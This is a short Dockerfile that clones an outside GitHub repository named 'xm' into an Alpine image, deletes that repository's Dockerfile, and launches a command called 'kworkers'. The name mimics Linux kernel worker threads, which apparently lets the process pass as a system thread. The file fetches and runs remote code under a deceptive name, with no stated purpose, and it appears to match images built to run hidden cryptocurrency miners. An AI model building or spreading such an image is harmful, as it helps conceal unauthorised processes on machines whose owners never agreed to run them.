FROM alpine:latest
RUN set -ex \
    && apk add git \
    && cd /home \
    && git clone https://github.com/caeken/xm \
    && rm /home/xm/Dockerfile \
    && cd /home/xm

CMD ["kworkers"]
